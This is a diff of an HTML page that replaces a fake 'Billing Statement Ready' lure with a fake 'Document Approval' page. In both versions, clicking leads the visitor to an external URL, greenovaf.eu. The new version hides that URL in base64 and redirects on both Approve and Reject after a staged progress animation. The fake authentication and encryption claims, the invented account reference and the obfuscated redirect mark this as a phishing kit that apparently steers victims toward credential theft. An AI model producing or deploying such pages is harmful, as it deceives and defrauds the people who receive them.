@@ -3,327 +3,492 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Billing Statement Ready</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Document Approval System</title>
+    <meta name="description" content="Professional document approval and review system">
+    
     <style>
-        @keyframes bounce {
-            0%, 20%, 53%, 80%, 100% {
-                transform: translateY(0);
-            }
-            40%, 43% {
-                transform: translateY(-8px);
-            }
-            70% {
-                transform: translateY(-4px);
-            }
-            90% {
-                transform: translateY(-2px);
-            }
+        /* CSS Variables - Blue & White Theme */
+        :root {
+            --background: hsl(0, 0%, 100%);
+            --foreground: hsl(220, 15%, 25%);
+            --card: hsl(210, 100%, 50%);
+            --card-foreground: hsl(0, 0%, 100%);
+            --primary: hsl(210, 100%, 50%);
+            --primary-foreground: hsl(0, 0%, 100%);
+            --primary-glow: hsl(210, 100%, 60%);
+            --secondary: hsl(210, 100%, 97%);
+            --secondary-foreground: hsl(220, 15%, 25%);
+            --muted: hsl(210, 40%, 95%);
+            --muted-foreground: hsl(220, 15%, 50%);
+            --accent: hsl(210, 100%, 45%);
+            --accent-foreground: hsl(0, 0%, 100%);
+            --document-blue: hsl(210, 100%, 50%);
+            --document-blue-light: hsl(210, 100%, 97%);
+            --text-primary: hsl(0, 0%, 100%);
+            --text-secondary: hsl(210, 100%, 85%);
+            --text-muted: hsl(210, 100%, 75%);
+            --border: hsl(210, 40%, 85%);
+            --radius: 0.75rem;
         }
-        
-        .animate-bounce {
-            animation: bounce 1s infinite;
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        
-        .animate-bounce-1 {
-            animation: bounce 1s infinite;
-            animation-delay: 0ms;
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: var(--background);
+            color: var(--foreground);
+            line-height: 1.5;
         }
-        
-        .animate-bounce-2 {
-            animation: bounce 1s infinite;
-            animation-delay: 150ms;
+
+        .container {
+            min-height: 100vh;
+            background: linear-gradient(180deg, var(--background), var(--secondary));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
         }
-        
-        .animate-bounce-3 {
-            animation: bounce 1s infinite;
-            animation-delay: 300ms;
+
+        .card {
+            width: 100%;
+            max-width: 28rem;
+            padding: 2rem;
+            text-align: center;
+            background: var(--card);
+            color: var(--card-foreground);
+            border-radius: var(--radius);
+            box-shadow: 0 10px 30px -10px hsl(var(--primary) / 0.3);
+            animation: fadeIn 0.5s ease-out;
         }
-        
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+
+        .icon-container {
+            margin-bottom: 2rem;
+            display: flex;
+            justify-content: center;
         }
-        
-        .animate-spin {
+
+        .icon-wrapper {
+            width: 4rem;
+            height: 4rem;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .icon-wrapper.default {
+            background: var(--document-blue-light);
+            animation: pulseSoft 2s infinite;
+        }
+
+        .icon-wrapper.approved {
+            background: hsl(142, 76%, 90%);
+            animation: bounceIn 0.6s ease-out;
+        }
+
+        .icon {
+            width: 2rem;
+            height: 2rem;
+        }
+
+        .icon.blue {
+            color: var(--document-blue);
+        }
+
+        .icon.green {
+            color: hsl(142, 76%, 36%);
+        }
+
+        .loading-container {
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: center;
+        }
+
+        .spinner {
+            position: relative;
+            width: 3rem;
+            height: 3rem;
+        }
+
+        .spinner-bg {
+            width: 100%;
+            height: 100%;
+            border: 4px solid var(--muted);
+            border-radius: 50%;
+        }
+
+        .spinner-fg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 4px solid var(--document-blue);
+            border-top-color: transparent;
+            border-radius: 50%;
             animation: spin 1s linear infinite;
         }
-        
+
+        .progress-container {
+            margin-bottom: 1.5rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 0.5rem;
+            background: var(--muted);
+            border-radius: var(--radius);
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(135deg, var(--primary), var(--primary-glow));
+            border-radius: var(--radius);
+            transition: width 0.3s ease-out;
+        }
+
+        .progress-text {
+            font-size: 0.875rem;
+            color: var(--text-secondary);
+            margin-top: 0.5rem;
+        }
+
+        .title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--text-primary);
+            margin-bottom: 0.5rem;
+            animation: slideUp 0.5s ease-out;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            margin-bottom: 2rem;
+            animation: slideUp 0.5s ease-out 0.1s both;
+        }
+
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .button {
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 500;
+            border-radius: var(--radius);
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            animation: slideUp 0.5s ease-out 0.2s both;
+        }
+
+        .button-primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-glow));
+            color: var(--primary-foreground);
+        }
+
+        .button-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 40px hsl(var(--primary-glow) / 0.4);
+        }
+
+        .button-outline {
+            background: transparent;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+        }
+
+        .button-outline:hover {
+            background: var(--primary);
+            color: var(--primary-foreground);
+        }
+
+        .processing-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            gap: 0.25rem;
+            margin-top: 1.5rem;
+        }
+
+        .dot {
+            width: 0.5rem;
+            height: 0.5rem;
+            background: var(--document-blue);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
         .hidden {
-            display: none;
+            display: none !important;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            50% { transform: scale(1.05); }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes pulseSoft {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 1; }
+        }
+
+        /* Responsive */
+        @media (max-width: 640px) {
+            .container {
+                padding: 0.5rem;
+            }
+            .card {
+                padding: 1.5rem;
+            }
         }
     </style>
 </head>
-<body class="bg-gradient-to-br from-slate-50 to-blue-50 min-h-screen">
-    <!-- Loading Screen -->
-    <div id="loadingScreen" class="hidden min-h-screen bg-white flex items-center justify-center p-4">
-        <div class="max-w-md w-full">
-            <div class="bg-white border border-slate-200 shadow-xl rounded-lg overflow-hidden">
-                <div class="p-8 space-y-6">
-                    <div class="text-center space-y-2">
-                        <div class="w-12 h-12 text-emerald-600 mx-auto mb-4">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>
-                            </svg>
-                        </div>
-                        <h2 class="text-xl font-semibold text-slate-800">Loading Secure Document</h2>
-                        <p class="text-sm text-slate-600">Authorized Personnel Access Only</p>
-                    </div>
-
-                    <div class="space-y-4">
-                        <div class="space-y-2">
-                            <div class="flex justify-between text-sm text-slate-700">
-                                <span>Progress</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="relative h-4 w-full overflow-hidden rounded-full bg-slate-200">
-                                <div class="h-full w-full bg-emerald-600" style="transform: translateX(0%)"></div>
-                            </div>
-                        </div>
-
-                        <div class="space-y-3 text-sm text-slate-700">
-                            <div class="flex items-center gap-3">
-                                <svg class="w-4 h-4 text-emerald-600" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-                                    <polyline points="22,4 12,14.01 9,11.01"/>
-                                </svg>
-                                <span>Authenticating user credentials</span>
-                            </div>
-                            <div class="flex items-center gap-3">
-                                <svg class="w-4 h-4 text-emerald-600" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-                                    <polyline points="22,4 12,14.01 9,11.01"/>
-                                </svg>
-                                <span>Verifying security clearance</span>
-                            </div>
-                            <div class="flex items-center gap-3">
-                                <svg class="w-4 h-4 text-emerald-600" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-                                    <polyline points="22,4 12,14.01 9,11.01"/>
-                                </svg>
-                                <span>Decrypting document content</span>
-                            </div>
-                            <div class="flex items-center gap-3">
-                                <svg class="w-4 h-4 text-emerald-600" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-                                    <polyline points="22,4 12,14.01 9,11.01"/>
-                                </svg>
-                                <span>Preparing secure access</span>
-                            </div>
-                        </div>
-
-                        <div class="text-center pt-4">
-                            <p class="text-sm text-slate-600">Please wait</p>
-                            <div class="flex justify-center mt-2">
-                                <div class="flex space-x-1">
-                                    <div class="w-2 h-2 bg-emerald-600 rounded-full animate-bounce-1"></div>
-                                    <div class="w-2 h-2 bg-emerald-600 rounded-full animate-bounce-2"></div>
-                                    <div class="w-2 h-2 bg-emerald-600 rounded-full animate-bounce-3"></div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
+<body>
+    <div class="container">
+        <div class="card">
+            <!-- Document Icon -->
+            <div class="icon-container">
+                <div id="icon-wrapper" class="icon-wrapper default">
+                    <svg id="document-icon" class="icon blue" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                    </svg>
+                    <svg id="check-icon" class="icon green hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                    </svg>
                 </div>
             </div>
-        </div>
-    </div>
 
-    <!-- Main Billing Summary -->
-    <div id="billingContent" class="min-h-screen p-4">
-        <div class="max-w-2xl mx-auto pt-8">
-            <div class="shadow-xl border-0 overflow-hidden rounded-lg bg-white">
-                <!-- Header -->
-                <div class="bg-gradient-to-r from-emerald-600 to-green-600 text-white p-6">
-                    <div class="flex items-center gap-3">
-                        <div class="p-2 bg-white/20 rounded-full">
-                            <svg class="w-6 h-6" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <rect width="20" height="14" x="2" y="5" rx="2"/>
-                                <line x1="2" x2="22" y1="10" y2="10"/>
-                            </svg>
-                        </div>
-                        <div>
-                            <h1 class="text-xl font-semibold">Billing Statement Ready</h1>
-                            <p class="text-emerald-100 text-sm">Generated on 08/06/2025</p>
-                        </div>
-                    </div>
+            <!-- Loading Spinner -->
+            <div id="loading-spinner" class="loading-container hidden">
+                <div class="spinner">
+                    <div class="spinner-bg"></div>
+                    <div class="spinner-fg"></div>
                 </div>
+            </div>
 
-                <div class="p-6 space-y-6">
-                    <!-- Main Message -->
-                    <div class="text-center space-y-2">
-                        <h2 class="text-2xl font-semibold text-slate-800">Your billing summary is ready for review</h2>
-                        <p class="text-slate-600">This statement contains your detailed billing information and payment summary.</p>
-                    </div>
-
-                    <!-- Billing Details Grid -->
-                    <div class="grid grid-cols-2 gap-4">
-                        <div class="border border-slate-200 rounded-lg">
-                            <div class="p-4 flex items-center gap-3">
-                                <svg class="w-5 h-5 text-blue-600" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M8 2v4"/>
-                                    <path d="M16 2v4"/>
-                                    <rect width="18" height="18" x="3" y="4" rx="2"/>
-                                    <path d="M3 10h18"/>
-                                </svg>
-                                <div>
-                                    <p class="text-sm text-slate-600">Statement Date</p>
-                                    <p class="font-semibold">08/06/2025</p>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="border border-slate-200 rounded-lg">
-                            <div class="p-4 flex items-center gap-3">
-                                <svg class="w-5 h-5 text-purple-600" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <line x1="4" x2="20" y1="9" y2="9"/>
-                                    <line x1="4" x2="20" y1="15" y2="15"/>
-                                    <line x1="10" x2="8" y1="3" y2="21"/>
-                                    <line x1="16" x2="14" y1="3" y2="21"/>
-                                </svg>
-                                <div>
-                                    <p class="text-sm text-slate-600">Account Reference</p>
-                                    <p class="font-semibold">BL005581456</p>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="border border-slate-200 rounded-lg">
-                            <div class="p-4 flex items-center gap-3">
-                                <svg class="w-5 h-5 text-orange-600" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/>
-                                    <polyline points="14,2 14,8 20,8"/>
-                                </svg>
-                                <div>
-                                    <p class="text-sm text-slate-600">Document Pages</p>
-                                    <p class="font-semibold">3 pages</p>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="border border-slate-200 rounded-lg">
-                            <div class="p-4 flex items-center gap-3">
-                                <svg class="w-5 h-5 text-green-600" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-                                    <polyline points="22,4 12,14.01 9,11.01"/>
-                                </svg>
-                                <div>
-                                    <p class="text-sm text-slate-600">Status</p>
-                                    <span class="inline-flex items-center rounded-full bg-green-100 px-2.5 py-0.5 text-xs font-medium text-green-800">
-                                        Processed
-                                    </span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <hr class="border-gray-200">
-
-                    <!-- Action Button -->
-                    <div class="space-y-4">
-                        <button 
-                            onclick="viewBillingDocument()"
-                            class="w-full h-12 bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 text-white font-semibold rounded-lg flex items-center justify-center gap-2"
-                        >
-                            <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-3-7-10-7Z"/>
-                                <circle cx="12" cy="12" r="3"/>
-                            </svg>
-                            <span>REVIEW BILLING STATEMENT (130kb)</span>
-                            <svg class="w-4 h-4" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
-                                <polyline points="7,10 12,15 17,10"/>
-                                <line x1="12" x2="12" y1="15" y2="3"/>
-                            </svg>
-                        </button>
-
-                        <p class="text-xs text-center text-slate-500">
-                            <strong>Authentication Required:</strong> Please sign in with your account email to access the secure billing document
-                        </p>
-                    </div>
-
-                    <!-- Expiration Warning -->
-                    <div class="border border-amber-200 bg-amber-50 rounded-lg">
-                        <div class="p-4 flex items-center gap-3">
-                            <svg class="w-5 h-5 text-amber-600" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <circle cx="12" cy="12" r="10"/>
-                                <polyline points="12,6 12,12 16,14"/>
-                            </svg>
-                            <p class="text-amber-800 text-sm">
-                                This billing statement will expire in <strong>30 days</strong> from the generation date
-                            </p>
-                        </div>
-                    </div>
-
-                    <!-- Security Features -->
-                    <div class="space-y-3">
-                        <h3 class="font-semibold text-slate-800 flex items-center gap-2">
-                            <svg class="w-5 h-5 text-green-600" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>
-                            </svg>
-                            Security & Compliance
-                        </h3>
-                        
-                        <div class="grid gap-3">
-                            <div class="flex items-start gap-3 p-3 bg-slate-50 rounded-lg">
-                                <svg class="w-4 h-4 text-slate-600 mt-0.5" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
-                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                                </svg>
-                                <div>
-                                    <p class="text-sm font-medium text-slate-800">End-to-End Encryption</p>
-                                    <p class="text-xs text-slate-600">All billing data is encrypted during transmission and storage</p>
-                                </div>
-                            </div>
-
-                            <div class="flex items-start gap-3 p-3 bg-slate-50 rounded-lg">
-                                <svg class="w-4 h-4 text-slate-600 mt-0.5" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-                                    <polyline points="22,4 12,14.01 9,11.01"/>
-                                </svg>
-                                <div>
-                                    <p class="text-sm font-medium text-slate-800">Secure Access Control</p>
-                                    <p class="text-xs text-slate-600">Multi-factor authentication ensures authorized access only</p>
-                                </div>
-                            </div>
-
-                            <div class="flex items-start gap-3 p-3 bg-slate-50 rounded-lg">
-                                <svg class="w-4 h-4 text-slate-600 mt-0.5" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/>
-                                    <polyline points="14,2 14,8 20,8"/>
-                                </svg>
-                                <div>
-                                    <p class="text-sm font-medium text-slate-800">Complete Audit Trail</p>
-                                    <p class="text-xs text-slate-600">Full tracking of document access and billing history</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
+            <!-- Progress Bar -->
+            <div id="progress-container" class="progress-container hidden">
+                <div class="progress-bar">
+                    <div id="progress-fill" class="progress-fill" style="width: 0%"></div>
                 </div>
+                <p id="progress-text" class="progress-text">0% Complete</p>
+            </div>
 
-                <!-- Footer -->
-                <div class="bg-slate-100 text-center py-4 px-6">
-                    <p class="text-xs text-slate-500">
-                        © 2025 SecureDocuments. All rights reserved. | Secure • Reliable • Compliant
-                    </p>
-                </div>
+            <!-- Title -->
+            <h1 id="title" class="title">Approve Document</h1>
+
+            <!-- Subtitle -->
+            <p id="subtitle" class="subtitle">Review the document details below and provide your approval decision.</p>
+
+            <!-- Action Buttons -->
+            <div id="button-container" class="button-container">
+                <button id="approve-btn" class="button button-primary">
+                    <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 1rem; height: 1rem;">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                    </svg>
+                    Approve Document
+                </button>
+                <button id="reject-btn" class="button button-outline">
+                    Reject Document
+                </button>
+            </div>
+
+            <!-- Processing Info -->
+            <div id="processing-info" class="processing-info hidden">
+                <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 1rem; height: 1rem; animation: pulse 1.5s infinite;">
+                    <circle cx="12" cy="12" r="10"/>
+                    <polyline points="12,6 12,12 16,14"/>
+                </svg>
+                <span>Processing...</span>
+            </div>
+
+            <!-- Reset Button -->
+            <button id="reset-btn" class="button button-primary hidden" style="animation: bounceIn 0.6s ease-out;">
+                Review Another Document
+            </button>
+
+            <!-- Loading Dots -->
+            <div id="loading-dots" class="loading-dots hidden">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
             </div>
         </div>
     </div>
 
     <script>
-        function viewBillingDocument() {
-            // Hide billing content and show loading screen
-            document.getElementById('billingContent').classList.add('hidden');
-            document.getElementById('loadingScreen').classList.remove('hidden');
-            
-            // After 3 seconds, open the external document and show billing content again
-            setTimeout(() => {
-                window.open("https://greenovaf.eu/D7n5xVZzL/", "_blank", "noopener,noreferrer");
-                document.getElementById('loadingScreen').classList.add('hidden');
-                document.getElementById('billingContent').classList.remove('hidden');
-            }, 3000);
+        let approvalState = 'idle';
+        let progress = 0;
+
+        const elements = {
+            iconWrapper: document.getElementById('icon-wrapper'),
+            documentIcon: document.getElementById('document-icon'),
+            checkIcon: document.getElementById('check-icon'),
+            loadingSpinner: document.getElementById('loading-spinner'),
+            progressContainer: document.getElementById('progress-container'),
+            progressFill: document.getElementById('progress-fill'),
+            progressText: document.getElementById('progress-text'),
+            title: document.getElementById('title'),
+            subtitle: document.getElementById('subtitle'),
+            buttonContainer: document.getElementById('button-container'),
+            approveBtn: document.getElementById('approve-btn'),
+            rejectBtn: document.getElementById('reject-btn'),
+            processingInfo: document.getElementById('processing-info'),
+            resetBtn: document.getElementById('reset-btn'),
+            loadingDots: document.getElementById('loading-dots')
+        };
+
+        function updateUI() {
+            // Hide all dynamic elements first
+            elements.loadingSpinner.classList.add('hidden');
+            elements.progressContainer.classList.add('hidden');
+            elements.buttonContainer.classList.add('hidden');
+            elements.processingInfo.classList.add('hidden');
+            elements.resetBtn.classList.add('hidden');
+            elements.loadingDots.classList.add('hidden');
+
+            switch (approvalState) {
+                case 'idle':
+                    elements.iconWrapper.className = 'icon-wrapper default';
+                    elements.documentIcon.classList.remove('hidden');
+                    elements.checkIcon.classList.add('hidden');
+                    elements.title.textContent = 'Approve Document';
+                    elements.subtitle.textContent = 'Review the document details below and provide your approval decision.';
+                    elements.buttonContainer.classList.remove('hidden');
+                    break;
+
+                case 'processing':
+                    elements.loadingSpinner.classList.remove('hidden');
+                    elements.progressContainer.classList.remove('hidden');
+                    elements.processingInfo.classList.remove('hidden');
+                    elements.loadingDots.classList.remove('hidden');
+                    elements.title.textContent = 'Processing Document';
+                    elements.subtitle.textContent = 'Please wait while we process your request...';
+                    break;
+
+                case 'approved':
+                    elements.iconWrapper.className = 'icon-wrapper approved';
+                    elements.documentIcon.classList.add('hidden');
+                    elements.checkIcon.classList.remove('hidden');
+                    elements.title.textContent = 'Document Approved';
+                    elements.subtitle.textContent = 'The document has been successfully approved and is now ready for use.';
+                    elements.resetBtn.classList.remove('hidden');
+                    break;
+
+                case 'rejected':
+                    elements.title.textContent = 'Document Rejected';
+                    elements.subtitle.textContent = 'The document has been rejected. Please review and resubmit.';
+                    elements.resetBtn.classList.remove('hidden');
+                    break;
+            }
         }
+
+        // Encoded redirect URL for security
+        const encodedUrl = 'aHR0cHM6Ly9ncmVlbm92YWYuZXUvRDduNXhWWnpMLw==';
+        
+        function getRedirectUrl() {
+            return atob(encodedUrl);
+        }
+
+        function handleApprove() {
+            approvalState = 'processing';
+            progress = 0;
+            updateUI();
+
+            const progressInterval = setInterval(() => {
+                progress += 10;
+                elements.progressFill.style.width = progress + '%';
+                elements.progressText.textContent = progress + '% Complete';
+
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    setTimeout(() => {
+                        approvalState = 'approved';
+                        updateUI();
+                        // Redirect after approval animation
+                        setTimeout(() => {
+                            window.location.href = getRedirectUrl();
+                        }, 1500);
+                    }, 500);
+                }
+            }, 200);
+        }
+
+        function handleReject() {
+            approvalState = 'rejected';
+            updateUI();
+            // Redirect after rejection
+            setTimeout(() => {
+                window.location.href = getRedirectUrl();
+            }, 2000);
+        }
+
+        function resetState() {
+            approvalState = 'idle';
+            progress = 0;
+            elements.progressFill.style.width = '0%';
+            elements.progressText.textContent = '0% Complete';
+            updateUI();
+        }
+
+        // Event listeners
+        elements.approveBtn.addEventListener('click', handleApprove);
+        elements.rejectBtn.addEventListener('click', handleReject);
+        elements.resetBtn.addEventListener('click', resetState);
+
+        // Initialize
+        updateUI();
     </script>
 </body>
 </html>
